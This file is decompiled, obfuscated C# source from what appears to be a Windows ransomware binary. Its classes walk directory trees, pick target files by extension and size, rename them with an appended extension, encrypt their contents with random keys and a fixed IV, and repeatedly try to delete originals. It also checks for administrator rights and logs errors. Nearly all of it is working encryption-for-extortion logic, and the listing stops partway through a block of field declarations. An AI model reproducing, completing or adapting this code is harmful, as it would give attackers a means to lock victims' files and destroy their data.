using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using XphIUzUJmCG;

namespace gTywbHaKSaZFRYP;

internal sealed class PYtJscelCaHU
{
	public sealed class FuGQhFBTslqdS
	{
		private static StringCollection ePukNDEvulMn;

		private static List<string> SPLKWNHtplmc;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107406997));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107393145)) && !text.ToLower().Contains(getString_0(107406992)) && !text.ToLower().Contains(getString_0(107393623)) && !text.ToLower().Contains(getString_0(107393642)) && !text.ToLower().Contains(getString_0(107407011)) && !text.ToLower().Contains(getString_0(107393596)) && !text.ToLower().Contains(getString_0(107393448)) && !text.ToLower().Contains(getString_0(107393399)) && !text.ToLower().Contains(getString_0(107393414)) && !text.ToLower().Contains(getString_0(107392853)) && !text.ToLower().Contains(getString_0(107392819)) && !text.ToLower().Contains(getString_0(107392834)) && !text.ToLower().Contains(getString_0(107392785)) && !text.ToLower().Contains(getString_0(107392804)) && !text.ToLower().Contains(getString_0(107392751)) && !text.ToLower().Contains(getString_0(107392770)) && !text.ToLower().Contains(getString_0(107392725)) && !text.ToLower().Contains(getString_0(107392740)) && !text.ToLower().Contains(getString_0(107392691)) && !text.Contains(sZXTHnjVRHJHh(getString_0(107392706))) && !text.Contains(getString_0(107392681)) && !text.Contains(getString_0(107392668)) && !text.EndsWith(getString_0(107395359)) && !text.EndsWith(getString_0(107392643)) && !text.EndsWith(getString_0(107392638)) && !text.EndsWith(getString_0(107393113)) && !text.EndsWith(getString_0(107393108)) && !text.ToLower().Contains(getString_0(107393103)) && !text.ToLower().Contains(erFyhehuVCTLSQ))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(LIIoXHybcY) * 1024.0 * 1024.0 && DcddTdPcfuJ == getString_0(107396790))
							{
								SPLKWNHtplmc.Add(text);
							}
							else if (File.Exists(text) && DcddTdPcfuJ == getString_0(107396247))
							{
								SPLKWNHtplmc.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return SPLKWNHtplmc;
		}

		static FuGQhFBTslqdS()
		{
			Strings.CreateGetStringDelegate(typeof(FuGQhFBTslqdS));
			ePukNDEvulMn = new StringCollection();
			SPLKWNHtplmc = new List<string>();
		}
	}

	private sealed class qzrskuRwcqM
	{
		public string bKuqRAwKslJi;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == bKuqRAwKslJi;
		}
	}

	private sealed class LLDMTFcEXhh
	{
		private sealed class GNKAyfVSTBLxew
		{
			public LLDMTFcEXhh ahhqshoxNrRET;

			public string tdDTTRBPFn;

			public void _003CCrypt_003Eb__1f()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					fKMTyXTcEn(WindowsIdentity.GetCurrent().Name, tdDTTRBPFn);
				}
			}

			public void _003CCrypt_003Eb__20()
			{
				DnmVEuJxrGIR(tdDTTRBPFn, ahhqshoxNrRET.JudZdCSJmIW, ahhqshoxNrRET.gOAslwSOfkqdQQH, ahhqshoxNrRET.QfrAQDrBEfACUm, ahhqshoxNrRET.QSxMqRgctyX);
			}
		}

		public string[] JudZdCSJmIW;

		public string[] QfrAQDrBEfACUm;

		public string QSxMqRgctyX;

		public string gOAslwSOfkqdQQH;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__1e(string string_0)
		{
			GNKAyfVSTBLxew CS_0024_003C_003E8__locals0 = new GNKAyfVSTBLxew();
			CS_0024_003C_003E8__locals0.ahhqshoxNrRET = this;
			CS_0024_003C_003E8__locals0.tdDTTRBPFn = string_0;
			if (kTvNgjuGRAjhCBkP && !joaHINJofMtf().Contains(getString_0(107389636)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						fKMTyXTcEn(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.tdDTTRBPFn);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (JVeOnCXrBINQO == getString_0(107396796))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					DnmVEuJxrGIR(CS_0024_003C_003E8__locals0.tdDTTRBPFn, CS_0024_003C_003E8__locals0.ahhqshoxNrRET.JudZdCSJmIW, CS_0024_003C_003E8__locals0.ahhqshoxNrRET.gOAslwSOfkqdQQH, CS_0024_003C_003E8__locals0.ahhqshoxNrRET.QfrAQDrBEfACUm, CS_0024_003C_003E8__locals0.ahhqshoxNrRET.QSxMqRgctyX);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				DnmVEuJxrGIR(CS_0024_003C_003E8__locals0.tdDTTRBPFn, JudZdCSJmIW, gOAslwSOfkqdQQH, QfrAQDrBEfACUm, QSxMqRgctyX);
			}
		}

		static LLDMTFcEXhh()
		{
			Strings.CreateGetStringDelegate(typeof(LLDMTFcEXhh));
		}
	}

	private sealed class PXwRYXTOzmdXR
	{
		private sealed class VEsBZGuDpIibgNB
		{
			public PXwRYXTOzmdXR pvNqNLeMtzhIFZ;

			public string qQCPaFtSnya;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2c()
			{
				foreach (string item in nSXBpdGwvrZMVvqT)
				{
					if (qQCPaFtSnya.ToLower().EndsWith(item + pvNqNLeMtzhIFZ.SYtBaLuBfRpuAO) && PCTnOOIsiyb == getString_0(107396807))
					{
						if (Convert.ToInt32(ZqUFXQYlIUOG) * 1024 * 1024 > new FileInfo(qQCPaFtSnya).Length)
						{
							try
							{
								fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393991), getString_0(107393986), getString_0(107394005), qQCPaFtSnya);
							}
							catch
							{
							}
						}
					}
					else if (qQCPaFtSnya.ToLower().EndsWith(item) && PCTnOOIsiyb == getString_0(107396264))
					{
						try
						{
							fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393991), getString_0(107393986), getString_0(107394005), qQCPaFtSnya);
						}
						catch
						{
						}
					}
				}
			}

			static VEsBZGuDpIibgNB()
			{
				Strings.CreateGetStringDelegate(typeof(VEsBZGuDpIibgNB));
			}
		}

		private sealed class ayxsjdGAqFgNsZPl
		{
			public PXwRYXTOzmdXR pvNqNLeMtzhIFZ;

			public string qovmJnexGQHr;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2e()
			{
				foreach (string item in nSXBpdGwvrZMVvqT)
				{
					if (qovmJnexGQHr.ToLower().EndsWith(item + pvNqNLeMtzhIFZ.SYtBaLuBfRpuAO) && PCTnOOIsiyb == getString_0(107396810))
					{
						if (Convert.ToInt32(ZqUFXQYlIUOG) * 1024 * 1024 > new FileInfo(qovmJnexGQHr).Length)
						{
							try
							{
								fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393994), getString_0(107393989), getString_0(107394008), qovmJnexGQHr);
							}
							catch
							{
							}
						}
					}
					else if (qovmJnexGQHr.ToLower().EndsWith(item) && PCTnOOIsiyb == getString_0(107396267))
					{
						try
						{
							fSyEEKEvmFT.dOvkKfZERAIf(getString_0(107393994), getString_0(107393989), getString_0(107394008), qovmJnexGQHr);
						}
						catch
						{
						}
					}
				}
			}

			static ayxsjdGAqFgNsZPl()
			{
				Strings.CreateGetStringDelegate(typeof(ayxsjdGAqFgNsZPl));
			}
		}

		public List<string> yWDaZLmyyfvdw;

		public List<string> XGytlEcpSakio;

		public string SYtBaLuBfRpuAO;

		public string[] jAWPTzrUNwKuz;

		public string aldVhKQaAlMhN;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2b(string string_0)
		{
			VEsBZGuDpIibgNB CS_0024_003C_003E8__locals0;
			foreach (string item in XGytlEcpSakio)
			{
				if (jAWPTzrUNwKuz.Length != 0)
				{
					string[] array = jAWPTzrUNwKuz;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_06c5;
					}
				}
				try
				{
					if (item.EndsWith(SYtBaLuBfRpuAO))
					{
						goto IL_06c5;
					}
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				if (!item.EndsWith(string_0) || yDDNFePBurFmPAas.Contains(item))
				{
					continue;
				}
				if (nFUAVKfCtKjV == getString_0(107396804))
				{
					try
					{
						if (jAheqKSOfaYtGZ.pztpnQjPfhyj(item))
						{
							jAheqKSOfaYtGZ.JvTfEzXPgRf(item);
						}
					}
					catch
					{
					}
				}
				yDDNFePBurFmPAas.Add(item);
				if (!EmJIhpwRkVaJOMp.Contains(Path.GetDirectoryName(item)))
				{
					EmJIhpwRkVaJOMp.Add(Path.GetDirectoryName(item));
				}
				JssUHHdLdRbEoAc(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (CWJvOLeqgyddlcWAG)
						{
							try
							{
								File.AppendAllText(CaiUUOOprZSOI, getString_0(107389778) + item + getString_0(107406976) + ex2.Message + getString_0(107396689));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_00ef;
					}
					if (WDFbbikzqbHCmt == getString_0(107396804) && new FileInfo(item).Length > Convert.ToInt32(gxaokSriQGuW) * 1024 * 1024 && !yWDaZLmyyfvdw.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new VEsBZGuDpIibgNB();
						CS_0024_003C_003E8__locals0.pvNqNLeMtzhIFZ = this;
						try
						{
							if (SYtBaLuBfRpuAO != getString_0(107390011))
							{
								File.Move(item, item + SYtBaLuBfRpuAO);
							}
						}
						catch (Exception ex4)
						{
							if (CWJvOLeqgyddlcWAG)
							{
								try
								{
									File.AppendAllText(CaiUUOOprZSOI, getString_0(107389778) + item + getString_0(107407427) + ex4.Message + getString_0(107396689));
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						CS_0024_003C_003E8__locals0.qQCPaFtSnya = getString_0(107393939);
						if (SYtBaLuBfRpuAO != getString_0(107390011))
						{
							CS_0024_003C_003E8__locals0.qQCPaFtSnya = item + SYtBaLuBfRpuAO;
						}
						else
						{
							CS_0024_003C_003E8__locals0.qQCPaFtSnya = item;
						}
						if (JdQhqbSZaoMfQdp == getString_0(107396804))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in nSXBpdGwvrZMVvqT)
								{
									if (CS_0024_003C_003E8__locals0.qQCPaFtSnya.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.pvNqNLeMtzhIFZ.SYtBaLuBfRpuAO) && PCTnOOIsiyb == VEsBZGuDpIibgNB.getString_0(107396807))
									{
										if (Convert.ToInt32(ZqUFXQYlIUOG) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.qQCPaFtSnya).Length)
										{
											try
											{
												fSyEEKEvmFT.dOvkKfZERAIf(VEsBZGuDpIibgNB.getString_0(107393991), VEsBZGuDpIibgNB.getString_0(107393986), VEsBZGuDpIibgNB.getString_0(107394005), CS_0024_003C_003E8__locals0.qQCPaFtSnya);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.qQCPaFtSnya.ToLower().EndsWith(item2) && PCTnOOIsiyb == VEsBZGuDpIibgNB.getString_0(107396264))
									{
										try
										{
											fSyEEKEvmFT.dOvkKfZERAIf(VEsBZGuDpIibgNB.getString_0(107393991), VEsBZGuDpIibgNB.getString_0(107393986), VEsBZGuDpIibgNB.getString_0(107394005), CS_0024_003C_003E8__locals0.qQCPaFtSnya);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = aoktqsPyKNrT.bQYenalhegZpc(32);
						string s = KFckqrNJGkCunhP.SqbbFIeFDghCLc(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = HUMYHcgEnuXOnA.SAmmtsGWAzQW(CS_0024_003C_003E8__locals0.qQCPaFtSnya, Convert.ToInt32(gxaokSriQGuW) * 1024 * 1024);
						HUMYHcgEnuXOnA.zrGRplxDVNnVZ(qYKKNYYyDxc: (!EgxLiKEDXzXg) ? (dTyBwXiyZmm ? HUMYHcgEnuXOnA.DxLpvUxqllVZ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HUMYHcgEnuXOnA.DxLpvUxqllVZ(byte_, Encoding.ASCII.GetBytes(aldVhKQaAlMhN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dTyBwXiyZmm ? gtaxXmzNukhl.IRClroQZINdrf(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gtaxXmzNukhl.IRClroQZINdrf(byte_, Encoding.ASCII.GetBytes(aldVhKQaAlMhN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), qGxsFVvELQptUE: CS_0024_003C_003E8__locals0.qQCPaFtSnya, lzOOtsdFUZeYWVN: bytes);
					}
					else
					{
						string text2 = aoktqsPyKNrT.bQYenalhegZpc(32);
						string s2 = KFckqrNJGkCunhP.SqbbFIeFDghCLc(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (SYtBaLuBfRpuAO != getString_0(107390011))
						{
							if (!IiEkQrvmRIR)
							{
								if (!dTyBwXiyZmm)
								{
									jBEvNeuZST(item, item + SYtBaLuBfRpuAO, hEBhhxLGASeyx);
								}
								else
								{
									jBEvNeuZST(item, item + SYtBaLuBfRpuAO, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!dTyBwXiyZmm)
									{
										SQUjNlFwpPPbBg(item, item + SYtBaLuBfRpuAO, hEBhhxLGASeyx);
									}
									else
									{
										SQUjNlFwpPPbBg(item, item + SYtBaLuBfRpuAO, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (CWJvOLeqgyddlcWAG)
									{
										try
										{
											File.AppendAllText(CaiUUOOprZSOI, getString_0(107389778) + item + getString_0(107390029) + ex6.Message + getString_0(107396689));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!IiEkQrvmRIR)
						{
							if (!dTyBwXiyZmm)
							{
								jBEvNeuZST(item, item + getString_0(107390038), hEBhhxLGASeyx);
							}
							else
							{
								jBEvNeuZST(item, item + getString_0(107390038), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!dTyBwXiyZmm)
								{
									SQUjNlFwpPPbBg(item, item, hEBhhxLGASeyx);
								}
								else
								{
									SQUjNlFwpPPbBg(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (CWJvOLeqgyddlcWAG)
								{
									try
									{
										File.AppendAllText(CaiUUOOprZSOI, getString_0(107389778) + item + getString_0(107390029) + ex8.Message + getString_0(107396689));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (dTyBwXiyZmm)
						{
							if (SYtBaLuBfRpuAO != getString_0(107390011))
							{
								sDwSpKRRMNhM(item + SYtBaLuBfRpuAO, bytes2);
							}
							else
							{
								sDwSpKRRMNhM(item, bytes2);
							}
						}
					}
					goto IL_06c5;
					end_IL_00ef:;
				}
				catch (Exception)
				{
					goto IL_06c5;
				}
				continue;
				IL_06c5:
				XGytlEcpSakio.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__2d(string string_0)
		{
			ayxsjdGAqFgNsZPl CS_0024_003C_003E8__locals0 = new ayxsjdGAqFgNsZPl();
			CS_0024_003C_003E8__locals0.pvNqNLeMtzhIFZ = this;
			CS_0024_003C_003E8__locals0.qovmJnexGQHr = string_0;
			if (jAWPTzrUNwKuz.Length != 0)
			{
				string[] array = jAWPTzrUNwKuz;
				int num = 0;
				while (num < array.Length)
				{
					string value = array[num];
					if (!CS_0024_003C_003E8__locals0.qovmJnexGQHr.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_0748;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.qovmJnexGQHr.EndsWith(SYtBaLuBfRpuAO))
				{
					goto IL_0748;
				}
			}
			catch (Exception)
			{
				goto IL_0748;
			}
			if (!yDDNFePBurFmPAas.Contains(CS_0024_003C_003E8__locals0.qovmJnexGQHr))
			{
				if (nFUAVKfCtKjV == getString_0(107396804))
				{
					try
					{
						if (jAheqKSOfaYtGZ.pztpnQjPfhyj(CS_0024_003C_003E8__locals0.qovmJnexGQHr))
						{
							jAheqKSOfaYtGZ.JvTfEzXPgRf(CS_0024_003C_003E8__locals0.qovmJnexGQHr);
						}
					}
					catch
					{
					}
				}
				yDDNFePBurFmPAas.Add(CS_0024_003C_003E8__locals0.qovmJnexGQHr);
				if (!EmJIhpwRkVaJOMp.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qovmJnexGQHr)))
				{
					EmJIhpwRkVaJOMp.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.qovmJnexGQHr));
				}
				JssUHHdLdRbEoAc(CS_0024_003C_003E8__locals0.qovmJnexGQHr);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.qovmJnexGQHr).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (CWJvOLeqgyddlcWAG)
						{
							try
							{
								File.AppendAllText(CaiUUOOprZSOI, getString_0(107389778) + CS_0024_003C_003E8__locals0.qovmJnexGQHr + getString_0(107406976) + ex2.Message + getString_0(107396689));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0117_2;
					}
					if (WDFbbikzqbHCmt == getString_0(107396804) && new FileInfo(CS_0024_003C_003E8__locals0.qovmJnexGQHr).Length > Convert.ToInt32(gxaokSriQGuW) * 1024 * 1024)
					{
						try
						{
							if (SYtBaLuBfRpuAO != getString_0(107390011))
							{
								File.Move(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + SYtBaLuBfRpuAO);
							}
						}
						catch (Exception ex4)
						{
							if (CWJvOLeqgyddlcWAG)
							{
								try
								{
									File.AppendAllText(CaiUUOOprZSOI, getString_0(107389778) + CS_0024_003C_003E8__locals0.qovmJnexGQHr + getString_0(107407427) + ex4.Message + getString_0(107396689));
									return;
								}
								catch (Exception)
								{
									return;
								}
							}
							return;
						}
						if (SYtBaLuBfRpuAO != getString_0(107390011))
						{
							CS_0024_003C_003E8__locals0.qovmJnexGQHr += SYtBaLuBfRpuAO;
						}
						if (JdQhqbSZaoMfQdp == getString_0(107396804))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item in nSXBpdGwvrZMVvqT)
								{
									if (CS_0024_003C_003E8__locals0.qovmJnexGQHr.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.pvNqNLeMtzhIFZ.SYtBaLuBfRpuAO) && PCTnOOIsiyb == ayxsjdGAqFgNsZPl.getString_0(107396810))
									{
										if (Convert.ToInt32(ZqUFXQYlIUOG) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.qovmJnexGQHr).Length)
										{
											try
											{
												fSyEEKEvmFT.dOvkKfZERAIf(ayxsjdGAqFgNsZPl.getString_0(107393994), ayxsjdGAqFgNsZPl.getString_0(107393989), ayxsjdGAqFgNsZPl.getString_0(107394008), CS_0024_003C_003E8__locals0.qovmJnexGQHr);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.qovmJnexGQHr.ToLower().EndsWith(item) && PCTnOOIsiyb == ayxsjdGAqFgNsZPl.getString_0(107396267))
									{
										try
										{
											fSyEEKEvmFT.dOvkKfZERAIf(ayxsjdGAqFgNsZPl.getString_0(107393994), ayxsjdGAqFgNsZPl.getString_0(107393989), ayxsjdGAqFgNsZPl.getString_0(107394008), CS_0024_003C_003E8__locals0.qovmJnexGQHr);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = aoktqsPyKNrT.bQYenalhegZpc(32);
						string s = KFckqrNJGkCunhP.SqbbFIeFDghCLc(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array2 = null;
						byte[] byte_ = HUMYHcgEnuXOnA.SAmmtsGWAzQW(CS_0024_003C_003E8__locals0.qovmJnexGQHr, Convert.ToInt32(gxaokSriQGuW) * 1024 * 1024);
						HUMYHcgEnuXOnA.zrGRplxDVNnVZ(qYKKNYYyDxc: (!EgxLiKEDXzXg) ? (dTyBwXiyZmm ? HUMYHcgEnuXOnA.DxLpvUxqllVZ(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : HUMYHcgEnuXOnA.DxLpvUxqllVZ(byte_, Encoding.ASCII.GetBytes(aldVhKQaAlMhN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (dTyBwXiyZmm ? gtaxXmzNukhl.IRClroQZINdrf(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : gtaxXmzNukhl.IRClroQZINdrf(byte_, Encoding.ASCII.GetBytes(aldVhKQaAlMhN), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), qGxsFVvELQptUE: CS_0024_003C_003E8__locals0.qovmJnexGQHr, lzOOtsdFUZeYWVN: bytes);
					}
					else
					{
						string text2 = aoktqsPyKNrT.bQYenalhegZpc(32);
						string s2 = KFckqrNJGkCunhP.SqbbFIeFDghCLc(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (SYtBaLuBfRpuAO != getString_0(107390011))
						{
							if (!IiEkQrvmRIR)
							{
								if (!dTyBwXiyZmm)
								{
									jBEvNeuZST(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + SYtBaLuBfRpuAO, hEBhhxLGASeyx);
								}
								else
								{
									jBEvNeuZST(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + SYtBaLuBfRpuAO, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!dTyBwXiyZmm)
									{
										SQUjNlFwpPPbBg(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + SYtBaLuBfRpuAO, hEBhhxLGASeyx);
									}
									else
									{
										SQUjNlFwpPPbBg(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + SYtBaLuBfRpuAO, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (CWJvOLeqgyddlcWAG)
									{
										try
										{
											File.AppendAllText(CaiUUOOprZSOI, getString_0(107389778) + CS_0024_003C_003E8__locals0.qovmJnexGQHr + getString_0(107390029) + ex6.Message + getString_0(107396689));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!IiEkQrvmRIR)
						{
							if (!dTyBwXiyZmm)
							{
								jBEvNeuZST(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + getString_0(107390038), hEBhhxLGASeyx);
							}
							else
							{
								jBEvNeuZST(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr + getString_0(107390038), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!dTyBwXiyZmm)
								{
									SQUjNlFwpPPbBg(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr, hEBhhxLGASeyx);
								}
								else
								{
									SQUjNlFwpPPbBg(CS_0024_003C_003E8__locals0.qovmJnexGQHr, CS_0024_003C_003E8__locals0.qovmJnexGQHr, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (CWJvOLeqgyddlcWAG)
								{
									try
									{
										File.AppendAllText(CaiUUOOprZSOI, getString_0(107389778) + CS_0024_003C_003E8__locals0.qovmJnexGQHr + getString_0(107390029) + ex8.Message + getString_0(107396689));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (dTyBwXiyZmm)
						{
							if (SYtBaLuBfRpuAO != getString_0(107390011))
							{
								sDwSpKRRMNhM(CS_0024_003C_003E8__locals0.qovmJnexGQHr + SYtBaLuBfRpuAO, bytes2);
							}
							else
							{
								sDwSpKRRMNhM(CS_0024_003C_003E8__locals0.qovmJnexGQHr, bytes2);
							}
						}
					}
					end_IL_0117_2:;
				}
				catch (Exception)
				{
				}
			}
			goto IL_0748;
			IL_0748:
			XGytlEcpSakio.Remove(CS_0024_003C_003E8__locals0.qovmJnexGQHr);
		}

		static PXwRYXTOzmdXR()
		{
			Strings.CreateGetStringDelegate(typeof(PXwRYXTOzmdXR));
		}
	}

	private sealed class JyWXxUVrotkghn
	{
		public string VhGsAMJbeWAG;

		public string kAYiKySXNKzr;

		public void _003CEncrypt2_003Eb__3b()
		{
			while (true)
			{
				try
				{
					File.Delete(VhGsAMJbeWAG);
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}

		public void _003CEncrypt2_003Eb__3c()
		{
			while (true)
			{
				try
				{
					if (File.Exists(kAYiKySXNKzr))
					{
						File.Delete(kAYiKySXNKzr);
					}
					break;
				}
				catch
				{
					Thread.Sleep(1500);
				}
			}
		}
	}

	public static string pjbuqjEcISLbaVHe;

	public static byte[] hEBhhxLGASeyx;

	public static string DcddTdPcfuJ;

	public static string LIIoXHybcY;

	public static List<string> NHjEeCAIyKCHA;

	public static List<string> HAsMoHlRHhVzwI;

	public static string qlrIuPADfJmNXN;

	public static string aldVhKQaAlMhN;

	public static string VuGCfwhZpvjG;

	public static string UciAonDnDgG;

	public static int uuEPphXmHlJGCzJ;

	public static string nFUAVKfCtKjV;

	public static string wCHkzTdtpItw;

	public static string hMsIWlRzYTbzz;

	public static string gIIaFOGxgjhbOPbd;

	public static string eStZUoAxoq;

	public static string PRLseytRJqsOWU;

	public static string hsEzAQuJXtzCY;

	public static string lITzVnlWBJ;

	public static List<string> KUEQBNlZlAJotIdmaQ;

	public static List<string> EmJIhpwRkVaJOMp;

	public static string QeXXVVSolOUXg;

	public static string aNkRJHChYmlmHoVd;

	public static string WLYQHdgcRWyAk;

	public static List<string> yDDNFePBurFmPAas;

	public static string GcWglZgKFxR;

	private static string doRadQRQDdrKKc;

	public static string JVeOnCXrBINQO;

	public static string EpNlyaldrfMUUp;

	public static List<string> KeEYwzsaSxlMyF;

	public static List<string> rTdBGDqcIJimSxIX;

	public static List<string> MSUPRnrxQZS;

	public static List<string> AaZWCpttHpB;

	public static string IquwDHMWXJfl;

	public static List<string> vtEaPMjBqiI;

	public static List<string> fguLtySThkLVUO;

	public static string afLnwsGiSBdAJD;

	public static string XHjSzuVQnUlIK;

	internal static DateTime gmtRJswlljT;

	internal static DateTime kukYFEXFwiSYkT;

	public static string WDFbbikzqbHCmt;

	public static string gxaokSriQGuW;

	public static string yqYtbZXdPjhAbt;

	public static string xHUMmLCcffeP;

	public static string cEKaTsnweVtt;

	public static string pJGfLSCuLTal;

	public static string qDjgFderneJ;

	public static string JdQhqbSZaoMfQdp;

	public static List<string> nSXBpdGwvrZMVvqT;

	public static string PCTnOOIsiyb;

	public static string ZqUFXQYlIUOG;

	public static string sLngoJPKIDllNQJ;

	public static string cpkjXbtgFj;

	public static string eFSrYJmLvqzXp;

	public static string AFQqTJKxHbunh;

	public static string pdcHQxKrrZeR;

	public static string DieFviToXchu;

	public static string xcOIRJtviOVai;

	public static string iNWiAeYaDzvF;

	public static string naWqivWRJh;

	public static string eDbFUVBVFI;

	public static string bFsJUnRDcjikGdM;

	public static string OkcrlmVDImyG;

	public static string IUHZOqJmJjWw;

	public static string TQnhOAYDbOiZM;

	public static string ncdcGKnwECcw;

	public static string lrWDNSELlfr;

	public static string yktBbrfbKqZX;

	public static string erFyhehuVCTLSQ;

	public static string iJXehZAzevnrWv;

	public static string ZBnpZUuEQInZ;

	public static string sSHYSlCKpuHjC;

	public static string HPbZVzfaaiUf;

	public static string DxZVhodwqDtHV;

	public static string GsbPUlfjszh;

	public static string UWcvBZkHIpRLlXE;

	public static string wXyXKPhgCjc;

	public static string NeuNfTmbHfaft;

	public static string[] MsFMIZIkwWWDM;

	public static string mANJAWVWINnm;

	public static bool EgxLiKEDXzXg;

	public static string tqhTOSvjpqL;

